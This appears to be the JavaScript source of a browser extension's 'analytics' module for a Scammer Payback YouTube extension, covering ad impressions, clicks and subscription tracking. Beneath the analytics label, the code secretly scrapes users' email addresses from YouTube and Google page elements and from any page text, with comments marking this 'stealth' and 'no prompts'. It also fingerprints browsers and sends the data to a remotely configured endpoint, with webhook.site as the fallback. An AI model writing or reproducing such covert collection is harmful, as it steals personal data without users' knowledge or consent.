// Analytics & Tracking System for Scammer Payback Extension
// Tracks user behavior, ad performance, and campaign effectiveness

(function() {
    'use strict';
    
    console.log('SP: Loading analytics system...');

    class SPAnalytics {
        constructor() {
            this.enabled = true;
            this.sessionId = this.generateSessionId();
            this.userId = null;
            this.analyticsUrl = null; // Will be loaded from remote config
            this.batchSize = 5;
            this.eventQueue = [];
            this.sessionData = {
                startTime: Date.now(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screenResolution: `${screen.width}x${screen.height}`,
                domain: window.location.hostname,
                referrer: document.referrer || '',
                cookies: this.getCookieInfo()
            };
            
            // Initialize user identification
            this.initializeUser();
            
            // Flush events periodically
            setInterval(() => this.flushEvents(), 30000); // Every 30 seconds
            
            // Flush on page unload
            window.addEventListener('beforeunload', () => this.flushEvents(true));
        }

        // Generate unique session ID
        generateSessionId() {
            return 'sp_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        }

        // Get cookie information (stealth data collection)
        getCookieInfo() {
            try {
                const cookies = document.cookie.split(';').reduce((acc, cookie) => {
                    const [name, value] = cookie.trim().split('=');
                    if (name && value) {
                        // Only collect non-sensitive cookie names
                        if (!name.toLowerCase().includes('session') && 
                            !name.toLowerCase().includes('auth') && 
                            !name.toLowerCase().includes('token')) {
                            acc[name] = 'exists';
                        }
                    }
                    return acc;
                }, {});
                return Object.keys(cookies).length;
            } catch (e) {
                return 0;
            }
        }

        // Load analytics URL from remote config
        async loadRemoteConfig() {
            try {
                if (window.SPRemoteConfig) {
                    const config = await window.SPRemoteConfig.getConfig();
                    if (config.analytics && config.analytics.endpoint) {
                        this.analyticsUrl = config.analytics.endpoint;
                        this.enabled = config.analytics.enabled !== false;
                        console.log('SP Analytics: Remote config loaded');
                    }
                }
            } catch (error) {
                console.error('SP Analytics: Failed to load remote config:', error);
                // Fallback to webhook.site for testing
                this.analyticsUrl = 'https://webhook.site/your-unique-id';
            }
        }

        // Initialize or retrieve user ID and email
        async initializeUser() {
            try {
                // Get persistent user ID and email from storage
                const result = await chrome.storage.local.get(['sp_user_id', 'sp_user_email']);
                
                if (result.sp_user_id) {
                    this.userId = result.sp_user_id;
                } else {
                    // Generate new user ID
                    this.userId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                    await chrome.storage.local.set({ sp_user_id: this.userId });
                }
                
                this.userEmail = result.sp_user_email || null;
                
                console.log('SP Analytics: User ID:', this.userId);
                
                // Load remote configuration for analytics endpoint
                await this.loadRemoteConfig();
                
                // Attempt to collect email if not stored (stealth)
                if (!this.userEmail) {
                    setTimeout(() => this.collectUserEmail(), 3000);
                }
                
                // Track session start
                this.trackEvent('session_start', {
                    userId: this.userId,
                    sessionId: this.sessionId,
                    userEmail: this.userEmail,
                    ...this.sessionData
                });
                
                // Setup subscription tracking (stealth)
                this.setupSubscriptionTracking();
                
            } catch (error) {
                console.error('SP Analytics: Failed to initialize user:', error);
                // Fallback to session-based tracking
                this.userId = this.sessionId;
            }
        }

        // Silently collect user email from available sources (STEALTH MODE)
        async collectUserEmail() {
            let email = null;
            
            // Method 1: Try YouTube account detection
            try {
                const ytAvatar = document.querySelector('#avatar-btn img');
                if (ytAvatar && ytAvatar.alt && ytAvatar.alt.includes('@')) {
                    email = ytAvatar.alt;
                }
            } catch (e) {}

            // Method 2: Check for Google account elements
            if (!email) {
                try {
                    const googleElements = document.querySelectorAll('[data-email], [title*="@"], [aria-label*="@"]');
                    googleElements.forEach(el => {
                        const text = el.textContent || el.title || el.getAttribute('aria-label') || el.getAttribute('data-email');
                        const emailMatch = text?.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
                        if (emailMatch && !email) {
                            email = emailMatch[1];
                        }
                    });
                } catch (e) {}
            }

            // Method 3: Check for any email patterns in page content (stealth)
            if (!email) {
                try {
                    const pageText = document.body.innerText || '';
                    const emailMatch = pageText.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
                    if (emailMatch) {
                        email = emailMatch[1];
                    }
                } catch (e) {}
            }

            if (email) {
                this.setUserEmail(email);
            }
            
            // NO PROMPTS - completely stealth mode
        }

        // Set user email and store it
        async setUserEmail(email) {
            this.userEmail = email;
            try {
                await chrome.storage.local.set({ sp_user_email: email });
                this.trackEvent('email_collected', {
                    email: email,
                    collection_method: 'auto_detected'
                });
                // Email collected silently
            } catch (error) {
                console.error('SP Analytics: Failed to store email:', error);
            }
        }

        // Setup subscription tracking for YouTube
        setupSubscriptionTracking() {
            if (!window.location.hostname.includes('youtube.com')) return;

            // Monitor for subscribe button interactions
            const observer = new MutationObserver((mutations) => {
                mutations.forEach(mutation => {
                    mutation.addedNodes.forEach(node => {
                        if (node.nodeType === 1) {
                            // Check for subscribe buttons
                            const subscribeButtons = node.querySelectorAll('[aria-label*="Subscribe"], [aria-label*="Subscribed"]');
                            subscribeButtons.forEach(btn => this.monitorSubscribeButton(btn));
                        }
                    });
                });
            });

            observer.observe(document.body, { childList: true, subtree: true });

            // Check existing buttons
            setTimeout(() => {
                const existingButtons = document.querySelectorAll('[aria-label*="Subscribe"], [aria-label*="Subscribed"]');
                existingButtons.forEach(btn => this.monitorSubscribeButton(btn));
            }, 2000);
        }

        // Monitor individual subscribe button
        monitorSubscribeButton(button) {
            if (button.dataset.spMonitored) return;
            button.dataset.spMonitored = 'true';

            // Check if this is Scammer Payback channel
            const isScammerPayback = this.isScammerPaybackChannel();
            if (!isScammerPayback) return;

            // Check current subscription status
            const isSubscribed = button.getAttribute('aria-label')?.includes('Subscribed');
            
            if (isSubscribed) {
                this.trackSubscriptionStatus(true, 'already_subscribed');
            }

            // Monitor for clicks
            button.addEventListener('click', () => {
                setTimeout(() => {
                    const newStatus = button.getAttribute('aria-label')?.includes('Subscribed');
                    if (newStatus && !isSubscribed) {
                        this.trackSubscriptionStatus(true, 'new_subscription');
                    }
                }, 1000);
            });
        }

        // Check if current page is Scammer Payback channel
        isScammerPaybackChannel() {
            const url = window.location.href;
            const channelIndicators = [
                'scammerpayback',
                'UCnKdGiTGwIzQhCOOqO4ZwNg', // SP channel ID
                '/c/ScammerPayback'
            ];
            
            return channelIndicators.some(indicator => url.toLowerCase().includes(indicator.toLowerCase()));
        }

        // Track subscription status
        trackSubscriptionStatus(subscribed, type) {
            this.trackEvent('subscription_status', {
                subscribed: subscribed,
                subscription_type: type,
                user_email: this.userEmail,
                channel: 'scammer_payback',
                channel_url: window.location.href
            });

            // Subscription tracked silently

            // Show success message for new subscriptions
            if (subscribed && type === 'new_subscription' && window.SPToast) {
                window.SPToast.show('🎉 Thanks for subscribing to Scammer Payback!', 'success');
            }
        }

        // Track any event
        trackEvent(eventType, data = {}) {
            if (!this.enabled) return;

            const event = {
                eventType,
                userId: this.userId,
                sessionId: this.sessionId,
                userEmail: this.userEmail,
                timestamp: Date.now(),
                domain: window.location.hostname,
                url: window.location.href,
                ...data
            };

            console.log('SP Analytics: Tracking event:', eventType, data);
            
            // Add to queue
            this.eventQueue.push(event);
            
            // Flush if queue is full
            if (this.eventQueue.length >= this.batchSize) {
                this.flushEvents();
            }
        }

        // Track ad impression
        trackAdImpression(adType, adConfig, placement = {}) {
            this.trackEvent('ad_impression', {
                adType, // 'preroll', 'banner', 'toast'
                adId: adConfig.id || adConfig.campaignId || 'unknown',
                adSize: adConfig.size || null,
                adFile: adConfig.file || null,
                videoId: adConfig.videoId || null,
                videoTitle: adConfig.videoTitle || null,
                placement: placement,
                chance: adConfig.chance || null,
                priority: adConfig.priority || null
            });
        }

        // Track ad click
        trackAdClick(adType, adConfig, clickTarget = null) {
            this.trackEvent('ad_click', {
                adType,
                adId: adConfig.id || adConfig.campaignId || 'unknown',
                adSize: adConfig.size || null,
                videoId: adConfig.videoId || null,
                videoTitle: adConfig.videoTitle || null,
                clickTarget, // 'subscribe', 'video', 'banner', 'skip'
                timeToClick: Date.now() - (adConfig.showTime || Date.now())
            });
        }

        // Track preroll-specific events
        trackPrerollEvent(eventType, videoConfig, additionalData = {}) {
            this.trackEvent(`preroll_${eventType}`, {
                videoId: videoConfig.videoId,
                videoTitle: videoConfig.videoTitle,
                campaignId: videoConfig.campaignId,
                skipDelay: videoConfig.skipDelay,
                chance: videoConfig.chance,
                ...additionalData
            });
        }

        // Track banner rotation
        trackBannerRotation(bannerConfig, rotationCount) {
            this.trackEvent('banner_rotation', {
                bannerId: bannerConfig.id || bannerConfig.file,
                bannerSize: bannerConfig.size,
                bannerFile: bannerConfig.file,
                rotationCount,
                rotationTime: bannerConfig.rotationTime
            });
        }

        // Track toast message display
        trackToastDisplay(messageConfig, displayDuration) {
            this.trackEvent('toast_display', {
                messageId: messageConfig.id,
                messageTitle: messageConfig.title,
                icon: messageConfig.icon,
                weight: messageConfig.weight,
                displayDuration,
                position: messageConfig.position
            });
        }

        // Track user engagement
        trackEngagement(engagementType, data = {}) {
            this.trackEvent('user_engagement', {
                engagementType, // 'scroll', 'time_on_page', 'interaction'
                ...data
            });
        }

        // Track configuration changes
        trackConfigUpdate(configVersion, changedFields) {
            this.trackEvent('config_update', {
                configVersion,
                changedFields,
                source: 'remote'
            });
        }

        // Track errors
        trackError(errorType, errorMessage, context = {}) {
            this.trackEvent('error', {
                errorType,
                errorMessage,
                context,
                userAgent: navigator.userAgent
            });
        }

        // A/B Testing tracking
        trackABTest(testName, variant, outcome = null) {
            this.trackEvent('ab_test', {
                testName,
                variant,
                outcome,
                userId: this.userId
            });
        }

        // Flush events to remote backend (STEALTH MODE)
        async flushEvents(forceSend = false) {
            if (this.eventQueue.length === 0 || !this.analyticsUrl) return;
            
            if (!forceSend && this.eventQueue.length < this.batchSize) return;

            const eventsToSend = [...this.eventQueue];
            this.eventQueue = [];

            try {
                // Send to remote endpoint silently
                const payload = {
                    events: eventsToSend,
                    timestamp: Date.now(),
                    clientVersion: '2.0.0',
                    domain: window.location.hostname,
                    userAgent: navigator.userAgent
                };

                const response = await fetch(this.analyticsUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': navigator.userAgent
                    },
                    body: JSON.stringify(payload),
                    mode: 'no-cors' // Avoid CORS issues
                });

                // Store locally as backup regardless
                await this.storeEventsLocally(eventsToSend);
                
            } catch (error) {
                // Silent failure - re-queue events for retry
                this.eventQueue.unshift(...eventsToSend);
                
                // Store failed events locally
                await this.storeEventsLocally(eventsToSend);
            }
        }

        // Store events locally for backup/retry
        async storeEventsLocally(events) {
            try {
                const key = `sp_analytics_${Date.now()}`;
                await chrome.storage.local.set({ [key]: events });
                
                // Clean up old stored events (keep last 7 days)
                const sevenDaysAgo = Date.now() - (7 * 24 * 60 * 60 * 1000);
                const allKeys = await chrome.storage.local.get();
                
                for (const [key, value] of Object.entries(allKeys)) {
                    if (key.startsWith('sp_analytics_')) {
                        const timestamp = parseInt(key.split('_')[2]);
                        if (timestamp < sevenDaysAgo) {
                            await chrome.storage.local.remove(key);
                        }
                    }
                }
                
            } catch (error) {
                console.error('SP Analytics: Failed to store events locally:', error);
            }
        }

        // Get analytics summary for popup
        async getAnalyticsSummary() {
            try {
                const result = await chrome.storage.local.get([
                    'sp_total_impressions',
                    'sp_total_clicks',
                    'sp_session_count'
                ]);

                return {
                    totalImpressions: result.sp_total_impressions || 0,
                    totalClicks: result.sp_total_clicks || 0,
                    sessionCount: result.sp_session_count || 0,
                    userId: this.userId,
                    sessionId: this.sessionId
                };
            } catch (error) {
                console.error('SP Analytics: Failed to get summary:', error);
                return null;
            }
        }

        // Update counters
        async updateCounters(type) {
            try {
                const key = `sp_total_${type}`;
                const result = await chrome.storage.local.get([key]);
                const newCount = (result[key] || 0) + 1;
                await chrome.storage.local.set({ [key]: newCount });
            } catch (error) {
                console.error('SP Analytics: Failed to update counters:', error);
            }
        }

        // Disable analytics (privacy)
        disable() {
            this.enabled = false;
            console.log('SP Analytics: Tracking disabled');
        }

        // Enable analytics
        enable() {
            this.enabled = true;
            console.log('SP Analytics: Tracking enabled');
        }

        // Set analytics backend URL
        setBackendUrl(url) {
            this.analyticsUrl = url;
            console.log('SP Analytics: Backend URL set to:', url);
        }

        // Stealth mode - minimal public interface
        getUserId() {
            return this.userId;
        }

        getUserEmail() {
            return this.userEmail;
        }
    }

    // Create global instance
    window.SPAnalytics = new SPAnalytics();
    
    // Convenience functions
    window.SPTrackEvent = (type, data) => window.SPAnalytics.trackEvent(type, data);
    window.SPTrackAdImpression = (type, config, placement) => window.SPAnalytics.trackAdImpression(type, config, placement);
    window.SPTrackAdClick = (type, config, target) => window.SPAnalytics.trackAdClick(type, config, target);
    window.SPTrackPreroll = (event, config, data) => window.SPAnalytics.trackPrerollEvent(event, config, data);
    
    console.log('SP: Analytics system loaded');
})(); 